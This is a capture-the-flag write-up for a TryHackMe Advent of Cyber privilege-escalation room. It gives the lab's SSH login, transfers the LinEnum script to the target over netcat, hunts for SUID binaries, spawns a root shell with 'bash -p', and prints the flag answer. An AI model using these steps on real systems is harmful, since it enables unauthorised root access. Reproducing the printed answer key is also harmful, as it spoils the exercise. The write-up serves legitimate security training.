# The Rogue Gnome

Before we begin, we're going to need to deploy two Instances:

	1. The THM AttackBox by pressing the "Start AttackBox" button at the top-right of the page.
	2. The vulnerable Instance attached to this task by pressing the "Deploy" button at the top-right of this task/day.

- What type of privilege escalation involves using a user account to execute commands as an administrator?

	- `vertical`

- What is the name of the file that contains a list of users who are a part of the sudo group?


	- `sudoers`

- Use SSH to log in to the vulnerable machine like so: ssh cmnatic@MACHINE_IP
Input the following password when prompted: aoc2020

	no answer needed

- Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.
You may find uploading some of the enumeration scripts that were used during today's task to be useful.

	no answer needed

	- On your machine `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
	- `nc -lvnp 4444 < linEnum.sh`
	- On target `nc -w 3 <YOUR_IP> 4444 > linEnum.sh`
	- On target `chmod +x && ./linEnum.sh`
	- We can see there is `/bin/bash`. Good.
	- This could be done also with `find / -perm -u=s -type f 2>/dev/null`
	- On target `bash -p`
	- `cat /root/flag.txt`

- Use this executable to launch a system shell as root.
What are the contents of the file located at /root/flag.txt?

	- `thm{2fb10afe933296592}`





## see you ...
